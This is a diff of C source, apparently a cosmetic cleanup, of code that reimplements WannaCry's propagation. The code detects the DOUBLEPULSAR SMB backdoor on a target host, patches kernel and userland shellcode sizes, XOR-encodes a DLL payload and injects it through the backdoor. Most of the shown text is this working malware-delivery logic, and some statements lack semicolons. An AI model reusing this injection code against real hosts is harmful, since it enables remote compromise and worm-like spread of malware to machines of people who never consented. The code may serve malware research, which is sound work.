@@ -117,7 +117,8 @@ int IsDOUBLEPULSARInstalled(char *host, int flagUninstall, u_short hostshort)
 	//copy treeID from recvbuff @ 28, 29
     treeid[0] = recvbuff[28];
    	treeid[1] = recvbuff[29];
-	
+
+	//update treeid and userid in the trans2 session setup packet
 	trans2_session_setup[28] = treeid[0];
     trans2_session_setup[29] = treeid[1]
     trans2_session_setup[32] = userid[0];
@@ -197,8 +198,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	
 	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + PayloadSize + 12);
 	
-	//Copied from IDA
-	//DLL is added to the hMem location right after the runDLL shellcode
+	//Copied from IDA - DLL is added to the hMem location right after the runDLL shellcode
 	memcpy(hMem + shellcode_payload_size, Payload, PayloadSize);
 	
 	//not sure what is going on here, but looks like the total_size is getting populated here
@@ -244,13 +244,13 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		
 		//shellcode must be patched in 3 areas
 		
-		//1.) Kernel shellcode must be updated to include the DLL size + Userland shellcode size for proper allocation in memory
+		// 1.) Kernel shellcode must be updated to include the DLL size + Userland shellcode size for proper allocation in memory
 		DWORD DLL_and_UserlandShellcodeSize = 0x50D800 + 3978;
 		*(DWORD*)&x64_kernel_shellcode[0x86E] = DLL_and_UserlandShellcodeSize;
 		//0x4302CE - 0x42FA60 = 0x86E
 		//x64_kernel_shellcode[2158] = 0x50D800 + 3978;
 		
-		/* Userland shellcode DLL size len */
+		/* 2.) Userland shellcode DLL size len */
 		/* this value was obtained from subtracting the Userland shellcode size from the Total size of the entire shellcode
 		so...if entire shellcode size is 6144 or 0x1800
 		and if userland shellcode size is 3978, then kernel shellcode size is 2166 */
@@ -272,24 +272,23 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	sources:
 	https://www.cnblogs.com/shangdawei/p/3537773.html
 	#define _DWORD uint32
-        #define _QWORD uint64
+    #define _QWORD uint64
 	https://www.cnblogs.com/goodhacker/p/7692443.html
 	https://cloud.tencent.com/developer/article/1432392
 	https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h
 	*/
-	
-	int ctx = 0; //offset counter
+
+	//offset counter
+	int ctx = 0;
 	unsigned char Parametersbuffer[12];
 	
 	//the payload size doesn't change, but this is determined by the shellcode + DLL payload
-	//change this to dynamically change based on the size of the payload
 	unsigned int chunk_size = 4096;
 	unsigned int OffsetofChunkinPayload = 0; 
-	unsigned int bytesLeft = total_size; //Bytes Left counter
-	//WILL verify why wannacry in IDA says: shellcode_payload_size + DLLSize + 12
-	//OR use this:
-	//unsigned int bytesLeft = sizeof(hMem)/sizeof(hMem[0]);
+	unsigned int bytesLeft = total_size; 
+	//WILL verify why wannacry in IDA says: shellcode_payload_size + DLLSize + 12 OR use this instead: unsigned int bytesLeft = sizeof(hMem)/sizeof(hMem[0]);
 
+	//XOR the payload
 	for (i = 0; i < payload_totalsize; i++)
 	{
 		hMem[i] ^= byte_xor_key[i % 4];
@@ -382,8 +381,8 @@ int runPayloadOnTarget(char *host, u_short hostshort)
 	char recvbuff[1024];
 
 	name.sin_family = AF_INET;
-    	name.sin_addr.s_addr = inet_addr(host);
-    	name.sin_port = htons(hostshort);
+    name.sin_addr.s_addr = inet_addr(host);
+    name.sin_port = htons(hostshort);
 	dsock = socket(AF_INET, SOCK_STREAM, 0);
 	connect(dsock, (struct sockaddr*) &name, sizeof(name));
 	
@@ -408,7 +407,8 @@ int runPayloadOnTarget(char *host, u_short hostshort)
 	//copy treeID from recvbuff @ 28, 29
     treeid[0] = recvbuff[28];
    	treeid[1] = recvbuff[29];
-	
+
+	//update treeid and userid in the trans2 session setup packet
 	trans2_session_setup[28] = treeid[0];
     trans2_session_setup[29] = treeid[1]
     trans2_session_setup[32] = userid[0];
